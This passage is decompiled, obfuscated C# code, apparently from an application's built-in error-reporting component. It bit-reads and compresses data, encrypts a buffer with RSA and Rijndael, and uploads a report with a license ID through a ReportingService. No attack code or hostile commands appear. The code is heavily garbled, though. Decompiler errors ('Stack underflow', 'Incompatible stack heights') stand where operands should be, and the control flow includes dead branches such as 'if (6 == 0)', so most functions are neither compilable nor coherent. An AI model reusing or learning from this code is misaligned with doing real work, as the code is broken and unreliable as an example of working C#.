			return ((byte*)ptr)[12] != 0;
		}

		unsafe static int _0001(global::_0008._0004._0002 P_0, int P_1)
		{
			//IL_0037: Invalid comparison between Unknown and I4
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
			//IL_00af: Expected I4, but got Unknown
			//IL_00d7: Incompatible stack heights: 0 vs 1
			//IL_00dd: Incompatible stack heights: 0 vs 2
			//IL_00e3: Incompatible stack heights: 0 vs 1
			//IL_00e9: Incompatible stack heights: 0 vs 2
			//IL_00ef: Incompatible stack heights: 0 vs 1
			//IL_00f5: Incompatible stack heights: 0 vs 1
			//IL_00fb: Incompatible stack heights: 0 vs 1
			//IL_0101: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[8];
			try
			{
				if (6 == 0)
				{
					goto IL_00be;
				}
				_ = ((global::_0008._0004._0002)/*Error near IL_0019: Stack underflow*/)._0003;
				if (/*Error near IL_0023: Stack underflow*/ >= /*Error near IL_0023: Stack underflow*/)
				{
					goto IL_00be;
				}
				_ = ((global::_0008._0004._0002)/*Error near IL_002d: Stack underflow*/)._0001;
				int num = ((global::_0008._0004._0002)/*Error near IL_0037: Stack underflow*/)._0002;
				if ((int)/*Error near IL_0039: Stack underflow*/ != num)
				{
					_ = ((global::_0008._0004._0002)/*Error near IL_0056: Stack underflow*/)._0001;
					byte[] array = ((global::_0008._0004._0002)/*Error near IL_0060: Stack underflow*/)._0001;
					*(int*)ptr = P_0._0001;
					P_0._0001 = *(int*)ptr + 1;
					int num2 = array[*(int*)ptr] & 0xFF;
					byte[] array2 = P_0._0001;
					*(int*)ptr = P_0._0001;
					P_0._0001 = *(int*)ptr + 1;
					int num3 = num2 | ((array2[*(int*)ptr] & 0xFF) << 8);
					int num4 = P_0._0003;
					_003F val = /*Error near IL_00aa: Stack underflow*/| (num3 << num4);
					((global::_0008._0004._0002)/*Error near IL_00af: Stack underflow*/)._0001 = (uint)(int)val;
					P_0._0003 += 16;
					goto IL_00be;
				}
				*(int*)(nint)(/*Error near IL_0040: Stack underflow*/ + 4) = -1;
				goto end_IL_0009;
				IL_00be:
				*(int*)((byte*)ptr + 4) = (int)(P_0._0001 & ((1 << P_1) - 1));
				end_IL_0009:;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)P_0, (object)P_1);
				throw;
			}
			return *(int*)((byte*)ptr + 4);
		}

		static void _0001()
		{
			//IL_0031: Incompatible stack heights: 0 vs 1
			IDisposable disposable = default(IDisposable);
			try
			{
				do
				{
					_0011._0001();
					disposable = (IDisposable)/*Error near IL_0034: Stack underflow*/;
					try
					{
						do
						{
							if (0 == 0 && 0 == 0)
							{
								_0011._0001();
							}
						}
						while (8 == 0);
					}
					finally
					{
						if (disposable != null)
						{
							global::_000F._007E_0099(disposable);
						}
					}
				}
				while (7 == 0);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)disposable);
				throw;
			}
		}

		unsafe static int _0001(global::_0008._0004._0007 P_0, int P_1)
		{
			//IL_0013: Invalid comparison between Unknown and I4
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Unknown result type (might be due to invalid IL or missing references)
			//IL_003f: Expected I4, but got Unknown
			//IL_0045: Invalid comparison between Unknown and I4
			//IL_004a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 1
			void* ptr;
			if (3u != 0)
			{
				ptr = stackalloc byte[8];
				try
				{
					while (true)
					{
						int num = 255;
						if (num != 0)
						{
							if ((int)/*Error near IL_0015: Stack underflow*/ == num)
							{
								*(int*)(nint)(/*Error near IL_0019: Stack underflow*/ + 4) = 285;
								if (false)
								{
									continue;
								}
								break;
							}
							goto IL_0026;
						}
						goto IL_0045;
						IL_0026:
						*(int*)(nint)/*Error near IL_002c: Stack underflow*/ = 257;
						goto IL_003f;
						IL_003f:
						if (6 == 0)
						{
							goto IL_0026;
						}
						num = 8;
						goto IL_0045;
						IL_0045:
						if ((int)/*Error near IL_0047: Stack underflow*/ >= num)
						{
							do
							{
								int num2 = *(int*)(nint)/*Error near IL_0033: Stack underflow*/;
								*(int*)(nint)/*Error near IL_0036: Stack underflow*/ = num2 + 4;
							}
							while (false);
							P_1 = /*Error near IL_003d: Stack underflow*/>> 1;
							goto IL_003f;
						}
						*(int*)(nint)(/*Error near IL_004b: Stack underflow*/ + 4) = *(int*)ptr + P_1;
						break;
					}
				}
				catch (Exception ex)
				{
					_0011._0001(ex, (object)(*(int*)ptr), (object)P_0, (object)P_1);
					throw;
				}
			}
			return *(int*)((byte*)ptr + 4);
		}

		unsafe static void _0001(int[] P_0, global::_0008._0004._0007._0001 P_1)
		{
			//IL_003a: Unknown result type (might be due to invalid IL or missing references)
			//IL_004c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0056: Unknown result type (might be due to invalid IL or missing references)
			//IL_027c: Incompatible stack heights: 0 vs 1
			//IL_0282: Incompatible stack heights: 0 vs 1
			//IL_0288: Incompatible stack heights: 0 vs 1
			//IL_028e: Incompatible stack heights: 0 vs 1
			//IL_0294: Incompatible stack heights: 0 vs 1
			//IL_029a: Incompatible stack heights: 0 vs 2
			//IL_02a0: Incompatible stack heights: 0 vs 1
			//IL_02a6: Incompatible stack heights: 0 vs 1
			int[] array2 = default(int[]);
			int num3 = default(int);
			int num4 = default(int);
			int num5 = default(int);
			int num6 = default(int);
			do
			{
				void* ptr = stackalloc byte[36];
				try
				{
					byte[] array = new byte[((global::_0008._0004._0007._0001)/*Error near IL_0019: Stack underflow*/)._0001.Length];
					((global::_0008._0004._0007._0001)/*Error near IL_0025: Stack underflow*/)._0001 = array;
					int num = ((Array)/*Error near IL_0030: Stack underflow*/).Length / 2;
					*(int*)(nint)/*Error near IL_0034: Stack underflow*/ = num;
					_ = /*Error near IL_003b: Stack underflow*/+ 4;
					int num2 = (*(int*)(nint)/*Error near IL_0041: Stack underflow*/ + 1) / 2;
					*(int*)(nint)/*Error near IL_0046: Stack underflow*/ = num2;
					*(int*)(nint)(/*Error near IL_004d: Stack underflow*/ + 8) = 0;
					*(int*)(nint)(/*Error near IL_0057: Stack underflow*/ + 12) = 0;
					while (*(int*)((byte*)ptr + 12) < P_1._0003)
					{
						P_1._0001[*(int*)((byte*)ptr + 12)] = 0;
						(*(int*)((byte*)ptr + 12))++;
					}
					array2 = new int[*(int*)ptr];
					array2[*(int*)ptr - 1] = 0;
					*(int*)((byte*)ptr + 16) = *(int*)ptr - 1;
					while (*(int*)((byte*)ptr + 16) >= 0)
					{
						if (P_0[2 * *(int*)((byte*)ptr + 16) + 1] != -1)
						{
							*(int*)((byte*)ptr + 20) = array2[*(int*)((byte*)ptr + 16)] + 1;
							if (*(int*)((byte*)ptr + 20) > P_1._0003)
							{
								*(int*)((byte*)ptr + 20) = P_1._0003;
								(*(int*)((byte*)ptr + 8))++;
							}
							num3 = (array2[P_0[2 * *(int*)((byte*)ptr + 16)]] = (array2[P_0[2 * *(int*)((byte*)ptr + 16) + 1]] = *(int*)((byte*)ptr + 20)));
						}
						else
						{
							*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 16)];
							P_1._0001[*(int*)((byte*)ptr + 24) - 1]++;
							P_1._0001[P_0[2 * *(int*)((byte*)ptr + 16)]] = (byte)array2[*(int*)((byte*)ptr + 16)];
						}
						(*(int*)((byte*)ptr + 16))--;
					}
					if (*(int*)((byte*)ptr + 8) == 0)
					{
						continue;
					}
					num4 = P_1._0003 - 1;
					while (true)
					{
						if (P_1._0001[--num4] != 0)
						{
							do
							{
								P_1._0001[num4]--;
								P_1._0001[++num4]++;
								*(int*)((byte*)ptr + 8) -= 1 << P_1._0003 - 1 - num4;
							}
							while (*(int*)((byte*)ptr + 8) > 0 && num4 < P_1._0003 - 1);
							if (*(int*)((byte*)ptr + 8) <= 0)
							{
								break;
							}
						}
					}
					P_1._0001[P_1._0003 - 1] += *(int*)((byte*)ptr + 8);
					P_1._0001[P_1._0003 - 2] -= *(int*)((byte*)ptr + 8);
					num5 = 2 * *(int*)((byte*)ptr + 4);
					*(int*)((byte*)ptr + 28) = P_1._0003;
					while (*(int*)((byte*)ptr + 28) != 0)
					{
						*(int*)((byte*)ptr + 32) = P_1._0001[*(int*)((byte*)ptr + 28) - 1];
						while (*(int*)((byte*)ptr + 32) > 0)
						{
							num6 = 2 * P_0[num5++];
							if (P_0[num6 + 1] == -1)
							{
								P_1._0001[P_0[num6]] = (byte)(*(uint*)((byte*)ptr + 28));
								(*(int*)((byte*)ptr + 32))--;
							}
						}
						(*(int*)((byte*)ptr + 28))--;
					}
				}
				catch (Exception ex)
				{
					_0011._0001(ex, new object[16]
					{
						*(int*)ptr,
						*(int*)((byte*)ptr + 4),
						*(int*)((byte*)ptr + 8),
						array2,
						num4,
						num5,
						*(int*)((byte*)ptr + 12),
						*(int*)((byte*)ptr + 16),
						*(int*)((byte*)ptr + 20),
						num3,
						*(int*)((byte*)ptr + 24),
						*(int*)((byte*)ptr + 28),
						*(int*)((byte*)ptr + 32),
						num6,
						P_1,
						P_0
					});
					throw;
				}
			}
			while (5 == 0);
		}

		static void _0001(_0008 P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			string empty = string.Empty;
			_0011._0001((_0008)/*Error near IL_0012: Stack underflow*/, empty);
		}

		static int _0001(global::_0006._0001 P_0, int P_1)
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Incompatible stack heights: 1 vs 2
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Incompatible stack heights: 1 vs 2
			//IL_0033: Unknown result type (might be due to invalid IL or missing references)
			//IL_0034: Incompatible stack heights: 1 vs 2
			//IL_0036: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Expected I4, but got Unknown
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Expected I4, but got Unknown
			//IL_005c: Incompatible stack heights: 0 vs 1
			try
			{
				int num;
				int num2;
				if (0 == 0)
				{
					if (!((global::_0006._0001)/*Error near IL_000a: Stack underflow*/)._0001)
					{
						num = 384;
						goto IL_002e;
					}
					num = 384;
					do
					{
						_ = (/*Error near IL_0014: Stack underflow*/ - num) / 8;
					}
					while (7 == 0);
					if (num == 0)
					{
						goto IL_002e;
					}
					if (num == 0)
					{
						goto IL_0036;
					}
					_003F val = /*Error near IL_0021: Stack underflow*/+ num;
					if (0 == 0)
					{
						num2 = (int)val;
					}
				}
				goto end_IL_0000;
				IL_002e:
				_ = /*Error near IL_002f: Stack underflow*/- num;
				if (8u != 0)
				{
					_ = /*Error near IL_0034: Stack underflow*// num;
					_ = 37;
				}
				goto IL_0036;
				IL_0036:
				num2 = /*Error near IL_0037: Stack underflow*/+ num;
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0, (object)P_1);
				throw;
			}
			return (int)/*Error near IL_005b: Stack underflow*/;
		}

		static void _0001(global::_0003._0008 P_0, uint P_1)
		{
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 2
			object obj = default(object);
			try
			{
				try
				{
					obj = global::_0003._0008._0001;
					_ = _0092_0002._001B_0005;
					/*Error near IL_0047: Stack underflow*/((object)/*Error near IL_0047: Stack underflow*/);
					try
					{
						_0011._0001((global::_0003._0008)/*Error near IL_0022: Stack underflow*/);
						_0011._0001((uint)/*Error near IL_002c: Stack underflow*/);
					}
					finally
					{
						_0092_0002._001C_0005(obj);
					}
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, obj, (object)P_0, (object)P_1);
				throw;
			}
		}

		static string _0001(global::_0002._0006._0003 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0002._0006._0003)/*Error near IL_0007: Stack underflow*/)._0002;
		}

		static bool _0001(global::_0002._0005 P_0, string P_1)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			try
			{
				_0011._0001((string)/*Error near IL_0016: Stack underflow*/, (global::_0002._0005)/*Error near IL_0016: Stack underflow*/);
				bool flag = true;
			}
			catch (ThreadAbortException)
			{
				bool flag = false;
			}
			catch (Exception)
			{
				bool flag = false;
			}
			return (byte)/*Error near IL_0028: Stack underflow*/ != 0;
		}

		unsafe static global::_0006._0004._0002 _0001()
		{
			//IL_0050: Incompatible stack heights: 0 vs 3
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			if (uint.MaxValue != 0 && !global::_0006._0004._0001)
			{
				global::_0006._0004._0001 = default(global::_0006._0004._0002);
				try
				{
					while (true)
					{
						_ = ref global::_0006._0004._0001;
						_ = _007F._009F_0002;
						_001F._009E_0002(typeof(global::_0006._0004._0002).TypeHandle);
						/*Error near IL_0057: Stack underflow*/((Type)/*Error near IL_0057: Stack underflow*/);
						((global::_0006._0004._0002*)(nint)/*Error near IL_0032: Stack underflow*/)->_0001 = (int)/*Error near IL_0032: Stack underflow*/;
						_0011._0001(ref global::_0006._0004._0001);
						if (0 == 0 || 1 == 0)
						{
							if (uint.MaxValue != 0)
							{
								global::_0006._0004._0001 = true;
								break;
							}
							continue;
						}
						break;
					}
				}
				catch
				{
				}
			}
			return global::_0006._0004._0001;
		}

		static void _0001(Exception P_0, object P_1, object P_2, object P_3, object P_4)
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 4
			//IL_002c: Incompatible stack heights: 0 vs 3
			//IL_002f: Incompatible stack heights: 0 vs 3
			//IL_0033: Incompatible stack heights: 0 vs 3
			do
			{
				_ = new object[4];
				_ = 0;
				((object[])/*Error near IL_000d: Stack underflow*/)[/*Error near IL_000d: Stack underflow*/] = (object)/*Error near IL_000d: Stack underflow*/;
				/*Error near IL_000d: Stack underflow*/;
				_ = 1;
				((object[])/*Error near IL_0012: Stack underflow*/)[/*Error near IL_0012: Stack underflow*/] = (object)/*Error near IL_0012: Stack underflow*/;
				/*Error near IL_0012: Stack underflow*/;
				_ = 2;
				((object[])/*Error near IL_0017: Stack underflow*/)[/*Error near IL_0017: Stack underflow*/] = (object)/*Error near IL_0017: Stack underflow*/;
				/*Error near IL_0017: Stack underflow*/;
				_ = 3;
				((object[])/*Error near IL_001c: Stack underflow*/)[/*Error near IL_001c: Stack underflow*/] = (object)/*Error near IL_001c: Stack underflow*/;
				_0011._0001((Exception)/*Error near IL_003a: Stack underflow*/, (object[])/*Error near IL_003a: Stack underflow*/);
			}
			while (false ? true : false);
		}

		unsafe static byte[] _0001(byte[] P_0, byte[] P_1, byte[] P_2, global::_0010._0004 P_3)
		{
			//IL_01e6: Incompatible stack heights: 0 vs 1
			//IL_01f2: Incompatible stack heights: 0 vs 1
			//IL_01f8: Incompatible stack heights: 0 vs 1
			//IL_0208: Incompatible stack heights: 0 vs 1
			//IL_020e: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[28];
			global::_0008._0004._000F obj = default(global::_0008._0004._000F);
			byte[] array3 = default(byte[]);
			global::_0008._0004._0006 obj2 = default(global::_0008._0004._0006);
			byte[] array4 = default(byte[]);
			byte[] array5 = default(byte[]);
			byte[] array = default(byte[]);
			ICryptoTransform cryptoTransform = default(ICryptoTransform);
			byte[] array2 = default(byte[]);
			byte[] array6 = default(byte[]);
			Exception ex2 = default(Exception);
			try
			{
				try
				{
					new global::_0008._0004._000F();
					obj = (global::_0008._0004._000F)/*Error near IL_01ec: Stack underflow*/;
					switch (/*Error near IL_002e: Stack underflow*/)
					{
					case 1L:
					{
						_0011._0001((global::_0008._0004._000F)/*Error near IL_0202: Stack underflow*/, 25000571);
						IntPtr intPtr = (nint)((Array)/*Error near IL_004d: Stack underflow*/).LongLength;
						_0011._0001((global::_0008._0004._000F)/*Error near IL_0218: Stack underflow*/, (int)(nint)intPtr);
						*(int*)((byte*)ptr + 16) = 0;
						while (*(int*)((byte*)ptr + 16) < P_2.Length)
						{
							array3 = new byte[Math.Min(2097151, P_2.Length - *(int*)((byte*)ptr + 16))];
							Buffer.BlockCopy(P_2, *(int*)((byte*)ptr + 16), array3, 0, array3.Length);
							*(long*)ptr = obj.Position;
							_0011._0001(obj, 0);
							_0011._0001(obj, array3.Length);
							obj2 = new global::_0008._0004._0006();
							_0011._0001(array3, obj2);
							while (!_0011._0001(obj2))
							{
								array4 = new byte[512];
								*(int*)((byte*)ptr + 20) = _0011._0001(obj2, array4);
								if (*(int*)((byte*)ptr + 20) <= 0)
								{
									break;
								}
								obj.Write(array4, 0, *(int*)((byte*)ptr + 20));
							}
							_0011._0001(obj2);
							while (!_0011._0001(obj2))
							{
								array5 = new byte[512];
								*(int*)((byte*)ptr + 24) = _0011._0001(obj2, array5);
								if (*(int*)((byte*)ptr + 24) <= 0)
								{
									break;
								}
								obj.Write(array5, 0, *(int*)((byte*)ptr + 24));
							}
							*(long*)((byte*)ptr + 8) = obj.Position;
							obj.Position = *(long*)ptr;
							_0011._0001(obj, (int)_0011._0001(obj2));
							obj.Position = *(long*)((byte*)ptr + 8);
							*(int*)((byte*)ptr + 16) += array3.Length;
						}
						break;
					}
					case 3L:
						_0011._0001(obj, 58555003);
						array = _0011._0001((byte[])null, (byte[])null, P_2, global::_0010._0004._0002);
						cryptoTransform = _0011._0001(P_0, false, P_1);
						try
						{
							array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
							obj.Write(array2, 0, array2.Length);
						}
						finally
						{
							cryptoTransform?.Dispose();
						}
						break;
					default:
						throw new ArgumentOutOfRangeException("algorithm", P_3, "Selected compression algorithm is not supported.");
					}
					obj.Flush();
					obj.Close();
					array6 = obj.ToArray();
					return array6;
				}
				catch (Exception ex)
				{
					ex2 = ex;
					global::_0008._0004._0001 = "ERR 2003: " + ex2.Message;
					throw;
				}
			}
			catch (Exception ex3)
			{
				_0011._0001(ex3, new object[19]
				{
					obj,
					*(int*)((byte*)ptr + 16),
					array3,
					*(long*)ptr,
					obj2,
					*(long*)((byte*)ptr + 8),
					array4,
					*(int*)((byte*)ptr + 20),
					array5,
					*(int*)((byte*)ptr + 24),
					array,
					cryptoTransform,
					array2,
					array6,
					ex2,
					P_2,
					P_3,
					P_1,
					P_0
				});
				throw;
			}
		}

		static string _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			try
			{
				new global::_0004._0001();
				_0011._0001((global::_0004._0001)/*Error near IL_0014: Stack underflow*/);
				string text = (string)/*Error near IL_0017: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
			return (string)/*Error near IL_0023: Stack underflow*/;
		}

		static long _0001(global::_0008._0004._0006 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				long num = ((global::_0008._0004._0006)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (long)/*Error near IL_001c: Stack underflow*/;
		}

		static void _0001(string P_0, global::_0002._0007 P_1, byte[] P_2, string P_3, string P_4, global::_0004._0006 P_5)
		{
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 2
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_0064: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			try
			{
				if (0 == 0 && uint.MaxValue != 0)
				{
					new ReportingService(((global::_0002._0007)/*Error near IL_000d: Stack underflow*/)._0003);
					ReportingService reportingService = (ReportingService)/*Error near IL_0050: Stack underflow*/;
				}
				if (((global::_0002._0007)/*Error near IL_0018: Stack underflow*/)._0001 != null)
				{
					_ = _0096_0002._007E_0081_0005;
					IWebProxy webProxy = ((global::_0002._0007)/*Error near IL_0028: Stack underflow*/)._0001;
					/*Error near IL_0060: Stack underflow*/((object)/*Error near IL_0060: Stack underflow*/, webProxy);
				}
				string licenseID = P_1._0002;
				string text = ((ReportingService)/*Error near IL_003e: Stack underflow*/).UploadReport2(licenseID, P_2, P_3, P_4, P_0);
				/*Error near IL_0043: Stack underflow*/(text);
			}
			catch (Exception ex)
			{
				P_5(global::_0004._0019(global::_000E._0003._0001(107392684), global::_0007._007E_008D(ex)));
			}
		}

		static byte[] _0001(byte[] P_0, string P_1)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_02b5: Incompatible stack heights: 0 vs 2
			//IL_02bf: Incompatible stack heights: 0 vs 1
			//IL_02c9: Incompatible stack heights: 0 vs 1
			//IL_02d3: Incompatible stack heights: 0 vs 1
			RijndaelManaged rijndaelManaged = default(RijndaelManaged);
			RSACryptoServiceProvider rSACryptoServiceProvider = default(RSACryptoServiceProvider);
			MemoryStream memoryStream = default(MemoryStream);
			CryptoStream cryptoStream = default(CryptoStream);
			byte[] array = default(byte[]);
			byte[] array2 = default(byte[]);
			byte[] array3 = default(byte[]);
			byte[] array4 = default(byte[]);
			byte[] array5 = default(byte[]);
			byte[] array6 = default(byte[]);
			byte[] array7 = default(byte[]);
			byte[] array8 = default(byte[]);
			Exception ex4 = default(Exception);
			try
			{
				_ = _000E_0002._007E_0014_0004;
				global::_000E._0003._0001(107396052);
				/*Error near IL_02c9: Stack underflow*/((object)/*Error near IL_02c9: Stack underflow*/, (string)/*Error near IL_02c9: Stack underflow*/);
				if (0 == 0)
				{
					if ((int)/*Error near IL_001e: Stack underflow*/ == 0)
					{
						rijndaelManaged = null;
						rSACryptoServiceProvider = null;
						memoryStream = null;
						cryptoStream = null;
						try
						{
							rijndaelManaged = new RijndaelManaged();
							rSACryptoServiceProvider = new RSACryptoServiceProvider();
							_0011._0001(P_1, rSACryptoServiceProvider);
							global::_000F._007E_0002_0002(rijndaelManaged);
							global::_000F._007E_0003_0002(rijndaelManaged);
							array = new byte[48];
							_0093_0002._001E_0005(_0007_0002._007E_0011_0004(rijndaelManaged), 0, array, 0, 32);
							_0093_0002._001E_0005(_0007_0002._007E_0012_0004(rijndaelManaged), 0, array, 32, 16);
							memoryStream = new MemoryStream();
							try
							{
								array2 = _009A_0002._007E_0088_0005(rSACryptoServiceProvider, array, false);
								_009B_0002._007E_0089_0005(memoryStream, 1);
								_009B_0002._007E_0089_0005(memoryStream, _009C_0002._008A_0005(array2.Length / 8));
								_0088_0002._007E_0005_0005(memoryStream, array2, 0, array2.Length);
							}
							catch (CryptographicException)
							{
								try
								{
									array3 = new byte[16];
									array4 = new byte[16];
									_0093_0002._001E_0005(_0007_0002._007E_0011_0004(rijndaelManaged), 0, array3, 0, 16);
									_0093_0002._001E_0005(_0007_0002._007E_0011_0004(rijndaelManaged), 16, array4, 0, 16);
									array5 = _009A_0002._007E_0088_0005(rSACryptoServiceProvider, array3, false);
									array6 = _009A_0002._007E_0088_0005(rSACryptoServiceProvider, array4, false);
									array7 = _009A_0002._007E_0088_0005(rSACryptoServiceProvider, _0007_0002._007E_0012_0004(rijndaelManaged), false);
									_009B_0002._007E_0089_0005(memoryStream, 2);
									_009B_0002._007E_0089_0005(memoryStream, _009C_0002._008A_0005(array5.Length / 8));
									_0088_0002._007E_0005_0005(memoryStream, array5, 0, array5.Length);
									_0088_0002._007E_0005_0005(memoryStream, array6, 0, array6.Length);
									_0088_0002._007E_0005_0005(memoryStream, array7, 0, array7.Length);
								}
								catch (CryptographicException)
								{
									global::_0003._000E._0001 = global::_000E._0003._0001(107393512);
									array8 = null;
									return array8;
								}
							}
							cryptoStream = new CryptoStream(memoryStream, _009D_0002._007E_008B_0005(rijndaelManaged), CryptoStreamMode.Write);
							_0088_0002._007E_0005_0005(cryptoStream, P_0, 0, P_0.Length);
							global::_000F._007E_0004_0002(cryptoStream);
							array8 = _0007_0002._007E_0010_0004(memoryStream);
							return array8;
						}
						catch (Exception ex3)
						{
							ex4 = ex3;
							global::_0003._000E._0001 = global::_0004._0019(global::_000E._0003._0001(107393338), global::_0007._007E_008D(ex4));
							array8 = null;
							return array8;
						}
						finally
						{
							if (rijndaelManaged != null)
							{
								global::_000F._007E_0005_0002(rijndaelManaged);
							}
							if (rSACryptoServiceProvider != null)
							{
								global::_000F._007E_0006_0002(rSACryptoServiceProvider);
							}
							if (memoryStream != null)
							{
								global::_000F._007E_009E(memoryStream);
							}
							if (cryptoStream != null)
							{
								global::_000F._007E_009E(cryptoStream);
							}
						}
					}
					_ = 107393093;
				}
				global::_000E._0003._0001((int)/*Error near IL_02d3: Stack underflow*/);
				global::_0003._000E._0001 = (string)/*Error near IL_002d: Stack underflow*/;
				return null;
			}
			catch (Exception ex5)
			{
				_0011._0001(ex5, new object[15]
				{
					rijndaelManaged, rSACryptoServiceProvider, memoryStream, cryptoStream, array, array2, array3, array4, array5, array6,
					array7, array8, ex4, P_0, P_1
				});
				throw;
			}
		}

		static bool _0001(_0006 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0006)/*Error near IL_0007: Stack underflow*/)._0003;
		}

		static string _0001()
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			try
			{
				_0011._0001();
				string text = (string)/*Error near IL_000e: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
			return (string)/*Error near IL_001a: Stack underflow*/;
		}

		static void _0001(int P_0, global::_0008._0004._0007 P_1)
		{
			//IL_00e8: Incompatible stack heights: 0 vs 1
			//IL_00f8: Incompatible stack heights: 0 vs 1
			//IL_0108: Incompatible stack heights: 0 vs 1
			//IL_0118: Incompatible stack heights: 0 vs 1
			//IL_011e: Incompatible stack heights: 0 vs 2
			int num3 = default(int);
			try
			{
				if (0 == 0)
				{
					_0011._0001(((global::_0008._0004._0007)/*Error near IL_000d: Stack underflow*/)._0003);
					do
					{
						_0011._0001(((global::_0008._0004._0007)/*Error near IL_001c: Stack underflow*/)._0001);
					}
					while (false);
					_0011._0001(((global::_0008._0004._0007)/*Error near IL_002e: Stack underflow*/)._0002);
				}
				_ = ((global::_0008._0004._0007)/*Error near IL_003d: Stack underflow*/)._0001;
				int num = ((global::_0008._0004._0007)/*Error near IL_0047: Stack underflow*/)._0001._0002 - 257;
				if (uint.MaxValue != 0)
				{
					_0011._0001((global::_0008._0004._000E)/*Error near IL_0128: Stack underflow*/, num, 5);
				}
				_0011._0001(P_1._0001, P_1._0002._0002 - 1, 5);
				int num2;
				if (uint.MaxValue != 0)
				{
					_0011._0001(P_1._0001, P_0 - 4, 4);
					num2 = 0;
					if (num2 != 0)
					{
						goto IL_00b0;
					}
					num3 = num2;
					goto IL_00b1;
				}
				goto IL_00d7;
				IL_00b0:
				num3 = num2;
				goto IL_00b1;
				IL_00d7:
				global::_0008._0004._0007._0001 obj = P_1._0003;
				global::_0008._0004._0007._0001 obj2;
				_0011._0001(obj, obj2);
				return;
				IL_00b1:
				int num4 = num3;
				if (0 == 0)
				{
					if (num4 >= P_0)
					{
						obj2 = P_1._0001;
						if (6u != 0)
						{
							obj = P_1._0003;
							_0011._0001(obj, obj2);
							obj2 = P_1._0002;
							goto IL_00d7;
						}
						return;
					}
					_0011._0001(P_1._0001, (int)P_1._0003._0001[global::_0008._0004._0007._0001[num3]], 3);
					num4 = num3;
				}
				num2 = num4 + 1;
				goto IL_00b0;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num3, (object)P_1, (object)P_0);
				throw;
			}
		}

		static void _0001(global::_0007._0004 P_0)
		{
			//IL_0148: Unknown result type (might be due to invalid IL or missing references)
			//IL_0152: Expected O, but got Unknown
			//IL_0be4: Incompatible stack heights: 0 vs 2
			//IL_0bf4: Incompatible stack heights: 0 vs 2
			//IL_0c04: Incompatible stack heights: 0 vs 2
			//IL_0c14: Incompatible stack heights: 0 vs 1
			//IL_0c24: Incompatible stack heights: 0 vs 1
			_ = global::_000F._007E_0007_0002;
			Panel obj = ((global::_0007._0004)/*Error near IL_0010: Stack underflow*/)._0001;
			if (4u != 0)
			{
				/*Error near IL_0bee: Stack underflow*/(obj);
			}
			_ = global::_000F._007E_0007_0002;
			Panel obj2 = ((global::_0007._0004)/*Error near IL_0028: Stack underflow*/)._0002;
			/*Error near IL_0bfe: Stack underflow*/(obj2);
			_ = global::_000F._0007_0002;
			/*Error near IL_0c0e: Stack underflow*/((object)/*Error near IL_0c0e: Stack underflow*/);
			_0011._0001(((global::_0007._0004)/*Error near IL_0048: Stack underflow*/)._0001, global::_0003._0007._0002);
			_0011._0001(((global::_0007._0004)/*Error near IL_0059: Stack underflow*/)._0002, global::_0003._0007._0002);
			_0001_0003._007E_008E_0005(P_0._0001, (AnchorStyles)6);
			_0002_0003._007E_008F_0005(P_0._0001, (FlatStyle)3);
